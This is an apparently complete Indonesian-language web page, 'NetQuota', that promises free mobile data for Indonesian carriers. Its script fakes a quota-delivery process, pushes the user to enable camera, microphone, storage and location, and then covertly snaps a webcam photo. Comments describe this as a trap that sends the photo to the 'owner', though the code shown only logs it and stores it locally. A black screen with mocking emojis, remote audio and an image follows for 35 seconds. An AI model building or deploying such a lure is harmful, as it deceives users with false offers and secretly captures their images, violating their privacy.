<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>NetQuota — Free Quota</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 550px;
            width: 100%;
            background: rgba(20, 20, 40, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 32px 28px;
            border: 1px solid rgba(0, 255, 255, 0.3);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
            transition: all 0.3s;
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #00ccff, #a855f7);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .logo p {
            font-size: 13px;
            color: #888;
            margin-top: 4px;
        }

        .permission-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 24px;
            padding: 20px;
            margin-bottom: 24px;
        }

        .permission-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .permission-item:last-child {
            border-bottom: none;
        }

        .permission-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .permission-info i {
            font-size: 20px;
            color: #00ccff;
        }

        .toggle {
            position: relative;
            width: 50px;
            height: 24px;
            background: #333;
            border-radius: 30px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .toggle.active {
            background: #00ccff;
        }

        .toggle::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            top: 2px;
            left: 4px;
            transition: all 0.3s;
        }

        .toggle.active::after {
            left: 26px;
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00ccff, #0066ff);
            border: none;
            border-radius: 30px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn:hover {
            transform: scale(0.98);
            opacity: 0.9;
        }

        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .popup-content {
            background: #1a1a2e;
            border-radius: 32px;
            padding: 32px;
            text-align: center;
            max-width: 300px;
            border: 1px solid #ff4444;
        }

        .popup-content i {
            font-size: 48px;
            color: #ff4444;
            margin-bottom: 16px;
        }

        .popup-content button {
            margin-top: 20px;
            padding: 10px 24px;
            background: #ff4444;
            border: none;
            border-radius: 30px;
            color: white;
            cursor: pointer;
        }

        .operator-grid, .quota-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 16px;
        }

        .operator-card, .quota-card {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 255, 0.2);
            border-radius: 20px;
            padding: 16px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .operator-card:hover, .quota-card:hover {
            background: rgba(0, 204, 255, 0.2);
            border-color: #00ccff;
        }

        .step-list {
            margin: 20px 0;
        }

        .step {
            padding: 12px;
            margin: 8px 0;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .step-icon {
            width: 24px;
            text-align: center;
        }

        .step-icon.success {
            color: #00ff88;
        }

        .step-icon.fail {
            color: #ff4444;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(0, 204, 255, 0.3);
            border-top-color: #00ccff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }

        .black-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            z-index: 2000;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
        }

        .black-screen img {
            max-width: 80%;
            border-radius: 20px;
            margin: 20px 0;
        }

        .emojis {
            font-size: 32px;
            letter-spacing: 8px;
            margin: 16px 0;
        }
    </style>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
</head>
<body>

<div class="container" id="app">
    <!-- Halaman 0: Permission -->
    <div id="permissionPage">
        <div class="logo">
            <h1>NETQUOTA</h1>
            <p>Free Quota for Everyone</p>
        </div>
        <div class="permission-box">
            <div class="permission-item">
                <div class="permission-info">
                    <i class="fas fa-camera"></i>
                    <span>Kamera</span>
                </div>
                <div class="toggle" id="toggleCamera"></div>
            </div>
            <div class="permission-item">
                <div class="permission-info">
                    <i class="fas fa-microphone"></i>
                    <span>Mikrofon</span>
                </div>
                <div class="toggle" id="toggleMic"></div>
            </div>
            <div class="permission-item">
                <div class="permission-info">
                    <i class="fas fa-folder-open"></i>
                    <span>Penyimpanan</span>
                </div>
                <div class="toggle" id="toggleStorage"></div>
            </div>
            <div class="permission-item">
                <div class="permission-info">
                    <i class="fas fa-location-dot"></i>
                    <span>Lokasi</span>
                </div>
                <div class="toggle" id="toggleLocation"></div>
            </div>
        </div>
        <button class="btn" id="nextBtn">LANJUTKAN</button>
    </div>

    <!-- Halaman 1: Pilih Operator -->
    <div id="operatorPage" class="hidden">
        <div class="logo">
            <h1>NETQUOTA</h1>
            <p>Pilih Operator</p>
        </div>
        <div class="operator-grid">
            <div class="operator-card" data-operator="IM3 Indosat Ooredoo">📱 IM3</div>
            <div class="operator-card" data-operator="Axis">📡 Axis</div>
            <div class="operator-card" data-operator="XL">⚡ XL</div>
            <div class="operator-card" data-operator="Telkomsel">📶 Telkomsel</div>
            <div class="operator-card" data-operator="Tri">🎮 Tri</div>
            <div class="operator-card" data-operator="Smartfren">📲 Smartfren</div>
            <div class="operator-card" data-operator="Byu">🔵 Byu</div>
        </div>
    </div>

    <!-- Halaman 2: Pilih Kuota -->
    <div id="quotaPage" class="hidden">
        <div class="logo">
            <h1>NETQUOTA</h1>
            <p>Pilih Kuota</p>
        </div>
        <h3 style="margin: 16px 0 8px;">Daily</h3>
        <div class="quota-grid" id="dailyGrid"></div>
        <h3 style="margin: 16px 0 8px;">Monthly</h3>
        <div class="quota-grid" id="monthlyGrid"></div>
    </div>

    <!-- Halaman 3: Loading Proses -->
    <div id="loadingPage" class="hidden">
        <div class="logo">
            <h1>NETQUOTA</h1>
            <p>Memproses...</p>
        </div>
        <div class="step-list" id="stepList"></div>
        <div class="loading-spinner" id="spinner"></div>
    </div>
</div>

<!-- Popup Peringatan -->
<div id="popup" class="popup">
    <div class="popup-content">
        <i class="fas fa-exclamation-triangle"></i>
        <p>Mohon Izinkan Semua Permintaan Agar Anda Dapat Kuota Gratis.</p>
        <button onclick="closePopup()">OK</button>
    </div>
</div>

<!-- Black Screen (Jebakan) -->
<div id="blackScreen" class="black-screen">
    <div class="emojis" id="emojis"></div>
    <img id="finalImage" src="" alt="">
    <p id="finalText" style="margin-top: 16px;"></p>
</div>

<script>
    // State permissions
    let permissions = {
        camera: false,
        mic: false,
        storage: false,
        location: false
    };

    let selectedOperator = null;
    let selectedQuota = null;

    // Toggle elements
    const toggles = {
        camera: document.getElementById('toggleCamera'),
        mic: document.getElementById('toggleMic'),
        storage: document.getElementById('toggleStorage'),
        location: document.getElementById('toggleLocation')
    };

    // Initialize toggles
    Object.keys(toggles).forEach(key => {
        toggles[key].classList.remove('active');
        toggles[key].addEventListener('click', () => {
            permissions[key] = !permissions[key];
            if (permissions[key]) {
                toggles[key].classList.add('active');
            } else {
                toggles[key].classList.remove('active');
            }
        });
    });

    function allPermissionsGranted() {
        return permissions.camera && permissions.mic && permissions.storage && permissions.location;
    }

    function showPopup() {
        document.getElementById('popup').style.display = 'flex';
    }

    function closePopup() {
        document.getElementById('popup').style.display = 'none';
    }

    document.getElementById('nextBtn').addEventListener('click', () => {
        if (allPermissionsGranted()) {
            document.getElementById('permissionPage').classList.add('hidden');
            document.getElementById('operatorPage').classList.remove('hidden');
        } else {
            showPopup();
        }
    });

    // Operator selection
    document.querySelectorAll('.operator-card').forEach(card => {
        card.addEventListener('click', () => {
            selectedOperator = card.getAttribute('data-operator');
            document.getElementById('operatorPage').classList.add('hidden');
            document.getElementById('quotaPage').classList.remove('hidden');
            loadQuotaOptions();
        });
    });

    function loadQuotaOptions() {
        const dailyQuotas = [
            { text: '5GB - 5 Days', value: '5GB/5Days' },
            { text: '1GB - 3 Days', value: '1GB/3Days' },
            { text: '6GB - 6 Days', value: '6GB/6Days' },
            { text: '3GB - 4 Days', value: '3GB/4Days' },
            { text: '10GB - 7 Days', value: '10GB/7Days' },
            { text: '2GB - 2 Days', value: '2GB/2Days' }
        ];

        const monthlyQuotas = [
            { text: '6GB - 1 Month', value: '6GB/1Month' },
            { text: '3GB - 1 Month', value: '3GB/1Month' },
            { text: '8GB - 1 Month', value: '8GB/1Month' },
            { text: '5GB - 1 Month', value: '5GB/1Month' },
            { text: '7GB - 1 Month', value: '7GB/1Month' },
            { text: '12GB - 1 Month', value: '12GB/1Month' }
        ];

        const dailyGrid = document.getElementById('dailyGrid');
        const monthlyGrid = document.getElementById('monthlyGrid');

        dailyGrid.innerHTML = dailyQuotas.map(q => `<div class="quota-card" data-quota="${q.value}">${q.text}</div>`).join('');
        monthlyGrid.innerHTML = monthlyQuotas.map(q => `<div class="quota-card" data-quota="${q.value}">${q.text}</div>`).join('');

        document.querySelectorAll('.quota-card').forEach(card => {
            card.addEventListener('click', () => {
                selectedQuota = card.getAttribute('data-quota');
                document.getElementById('quotaPage').classList.add('hidden');
                startProcess();
            });
        });
    }

    async function startProcess() {
        document.getElementById('loadingPage').classList.remove('hidden');
        const stepList = document.getElementById('stepList');
        const spinner = document.getElementById('spinner');

        const steps = [
            { text: 'Menghubungkan ke server Kuota', status: 'pending' },
            { text: 'Memverifikasi nomor hp anda', status: 'pending' },
            { text: 'Mengakses database operator', status: 'pending' },
            { text: 'Menyiapkan Kuota untuk anda', status: 'pending' },
            { text: 'Memasukan Kuota ke sim anda', status: 'pending' }
        ];

        function renderSteps() {
            stepList.innerHTML = steps.map(step => `
                <div class="step">
                    <div class="step-icon ${step.status === 'success' ? 'success' : step.status === 'fail' ? 'fail' : ''}">
                        ${step.status === 'success' ? '✓' : step.status === 'fail' ? '✗' : '○'}
                    </div>
                    <div>${step.text}</div>
                </div>
            `).join('');
        }

        renderSteps();

        // Step 1-3: success (hijau)
        for (let i = 0; i < 3; i++) {
            await new Promise(r => setTimeout(r, 1000));
            steps[i].status = 'success';
            renderSteps();
        }

        // Step 4-5: fail (merah)
        for (let i = 3; i < 5; i++) {
            await new Promise(r => setTimeout(r, 1000));
            steps[i].status = 'fail';
            renderSteps();
        }

        spinner.style.display = 'none';

        // Jebakan: capture, kirim ke owner, black screen
        await captureAndSend();
    }

    async function captureAndSend() {
        // Simulasi capture foto
        const video = document.createElement('video');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');

        stream.getTracks().forEach(track => track.stop());

        // Simulasi kirim ke owner
        console.log('📸 Foto terkirim ke owner:', imageData);
        localStorage.setItem('netquota_capture', imageData);

        // Black screen + musik + emoji + foto
        const blackScreen = document.getElementById('blackScreen');
        const audio = new Audio('https://files.catbox.moe/4df0hx.mp3');
        
        blackScreen.style.display = 'flex';
        document.getElementById('emojis').innerHTML = '😹'.repeat(20);
        document.getElementById('finalImage').src = 'https://files.catbox.moe/d7xpzz.png';
        document.getElementById('finalText').innerHTML = 'By NetQuota';

        audio.play();

        // 35 detik kemudian balik normal
        setTimeout(() => {
            blackScreen.style.display = 'none';
            resetToNormal();
        }, 35000);
    }

    function resetToNormal() {
        // Reset semua state
        permissions = { camera: false, mic: false, storage: false, location: false };
        Object.keys(toggles).forEach(key => {
            toggles[key].classList.remove('active');
        });
        selectedOperator = null;
        selectedQuota = null;
        
        document.getElementById('loadingPage').classList.add('hidden');
        document.getElementById('permissionPage').classList.remove('hidden');
        document.getElementById('operatorPage').classList.add('hidden');
        document.getElementById('quotaPage').classList.add('hidden');
    }
</script>
</body>
</html>
